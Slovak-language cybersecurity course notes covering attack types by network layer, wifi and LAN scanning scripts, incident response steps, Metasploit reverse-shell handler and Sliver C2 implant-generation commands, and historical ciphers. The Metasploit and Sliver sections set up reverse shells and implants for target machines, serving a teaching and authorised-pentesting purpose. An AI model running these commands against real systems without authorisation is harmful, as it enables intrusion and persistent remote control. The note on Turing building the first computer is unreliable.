
## A.4 - HACKER NA CHRANENEJ SIETI

| **Vrstva**     | **Typ útoku**            | **Popis**                                                                                 |
| -------------- | ------------------------ | ----------------------------------------------------------------------------------------- |
| Fyzická vrstva | Sniffing                 | Odpočúvanie a zachytávanie dát prechádzajúcich sieťovým médiami.                          |
| Dátová linková | Spoofing                 | Falšovanie MAC adries alebo identít za účelom podvrhnutia komunikácie.                    |
| Sieťová        | MITM (Man-in-the-Middle) | Útočník sa vloží do komunikácie medzi dvoma stranami a zachytáva alebo mení dáta.         |
| Transportná    | Recon (Prieskum)         | Získavanie informácií o sieťových službách, otvorených portoch, atď.                      |
| Relačná        | Hijacking (Unos)         | Preberanie kontroly nad reláciou (napr. TCP session hijacking).                           |
| Prezentačná    | Phishing                 | Podvodné získavanie citlivých údajov (hesiel, kreditných kárt) cez falšované komunikácie. |
| Aplikačná      | Exploitácia              | Využívanie zraniteľností v aplikáciach na získanie neoprávneného prístupu.                |


>[!info] PENETRACNE TESTY !!!
PRISTUP DO USERA>ZISKAJ ROOT PRAVA>PREHLADAJ>ZABETONUJ (ABY ZOSTAL TVOJ)

>[! warning] 
>AK CHCETE UROBIŤ PENETRAČNÉ TESTY MUSÍTE MAŤ PISOMNE POVOLENIE SO ŠPECIFIKÁCIOU TESTOV A ČASOVÝM OBDOBÍM KEDY BUDÚ VYKONANÉ!!!



PREVENCIA:

Vsetko co sme sa doposial ucili. 

1. neopravneny scan  - ids, .pcap, logy

2. brute force attack - ids, pcap, logy  KODY /etc/passwd, /etc/shadow

3. neopravnena wifi - aircrack-ng, wifite


#### LINUX PYTHON SKRIPT NA VYPISANIE NAJDENYCH WIFI SIETI
```python
import subprocess

def scan_wifi():
    cmd = "nmcli dev wifi list"
    networks = subprocess.check_output(cmd, shell=True)
    networks = networks.decode("utf-8")
    return networks

print(scan_wifi())
```

SPUSTIME:
``` bash
python3 wifi_scan_linux.py
```

LINUX BASH SKRIPT NA SKENOVANIE WIFI kazdych 300 sekund {5 minut} uklada do suboru
``` bash
#!/bin/bash

while true; do
    nmcli dev wifi list >> wifi_list.txt
    sleep 300
done
```

SPUSTIME NA POZADI:

``` bash
sh ./wifi_scan_bash.sh &
```

>[!info] 
>Uloha spustena na pozadi sa objavi v zozname procesov pomocou prikazov ```ps```, ```top``` alebo pomocou prikazu ```jobs```. <br><br> Do popredia ulohu dostaneme pomocou prikazu ```fg``` a ukoncime `Ctrl-c` alebo ju nechame `Ctrl-z`. <br><br>Ak mame PID mozeme proces ukoncit `kill PID`




4.neopravnene zariadenie na LAN - nmap
``` bash
nmap IP/24 > zoznam_zariadeni.scan  # scanuje subsiet 254 zariadeni
```


5. privilege escalation - logy

>[! warning ]
>HACKER: PRIVILEGE ESCALATION je technika pomocou ktorej utocnik ziskava vyssie PERMISSIONS a tym pristup k sluzbam a suborom. Cielom je samozrejme byt ROOT.  


OPATRENIA:

a. Identifikacia pocitacov kde bol hacker uspesne pripojeny

b. Izolacia siete a analyza aktivit hackera

c. Dezinfekcia a reinstalacia

>[!warning] 
>AK BOL HACKER NA POCITACI A NIE SME SI ISTY CO SA MU PODARILO A CO NIE... AK SA DA. SPRAVTE KOMPLET REINSTALACIU NA NOVY HDD ALEBO SDD {NAJLEPSIE ESTE ZABALENY} !!! <br>
>VYMONTOVANY HACKNUTY DISK ODLOZTE PRE POTREBY POLICIE A FORENZNEHO SKUMANIA !!!  OZNACTE HO AKO JED AJ S ID CISLOM POCITACA :)

### A.5 HACKOVANIE WIFI SIETI PRAKTICKY

RASPBERRY PI CONNECT

[[SESSION7_Aircrack-ng a wifite2]]

# B. EXPLOITAČNÉ A C2 FRAMEWORKY
## B1. METASPLOIT FRAMEWORK- UKÁŽKA 

METASPLOIT je exploitačný framework obsahujúci tisíce možností ako sa nabúrať do Vašeho počítača. Jeho použitie zvládne aj začiatočník. Vie na diaľku využiť zraniteľnosť Vašeho počítača a získať do neho prístup. Vie vytvárať škodlivé kódy, ktoré na Vašom počítači vytvoria backdoory, reverzné shelly, získajú informácie či prístup do shellu. 

auxiliary = rozne nastroje ako scannery, 
exploit = vyuzitie zranitelnosti systemu na ziskanie kontroly alebo informacii
payload  = skodlivy kod ktory treba spustit u USERA
post- CITTE SA AKO DOMA
NOP = Maskovanie pred AV a IDS


``` metasploit

search windows
use module
show info
set RHOST
CMD: exploit, run, payload

sessions -l
sessions -i <CISLO>
background
```

Priklad 2
``` metasploit
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

```


## B2 SLIVER (C2 FRAMEWORK)

**Sliver** je moderný, open-source **implant framework** (a **C2 framework**), ktorý je navrhnutý pre **red teaming**, **penetračné testovanie** a **simulácie kybernetických útokov**. Je považovaný za alternatívu k nástrojom ako **Cobalt Strike** alebo **Metasploit**, ale s dôrazom na **stealth**, **flexibilitu** a **moderné techniky obchádzania obranných mechanizmov**.

Instalacia z githubu a kompilacia v go  https://github.com/BishopFox/sliver


Instalacia z githubu a kompilacia v go  https://github.com/BishopFox/sliver

``` bash
cd sliver
./sliver-server

generate --mtls IP_SERVER --os linux --arch amd64 --format elf --http IP_SERVER:PORT --save /home/vboxuser/Downloads

# vygeneruje subor ktory obsahuje skodlivy kod spustitelny na cielovom pocitaci
 
http -l 9000

jobs

sessions

use SESSION_ID


```


## C. KRYPTOGRAFIA

### C.1 Historické šifry
a.  Scytale 
b. Cézarova šifra a ROT13
c. Albertiho Sifrovaci disk 
Nihilist

#### C.2 Vernamova šifra (OTP)

342154 KLUC
181267 SPRAVA
423311 ZASIFROVANA POMOCOU OPERACIE ADD

423311 ZASIFROVANA
342154 KLUC
181267 ODSIFROVANA POMOCOU OPERACIE SUB


OTP cipher - One Time Pad

ABCDEFGHIJKLMNOPQRSTUVWXYZ

### C.3 ENIGMA - ELEKTROMECHANICKY SIFROVACI STROJ


Enigma bola elektromechanický šifrovací stroj používaný na šifrovanie komunikácie medzi jednotkami Nacistického Nemecka. Problémom boli predovšetkým útoky nemeckých ponoriek v Atlantiku. 

Alan Turing a tým jeho kryptoanalytikov v Bletchley Park,  postavil prvý počítač, ktorý dokázal túto šifru prelomiť a čítať tieto správy. Operácia ULTRA bola prísne utajená.
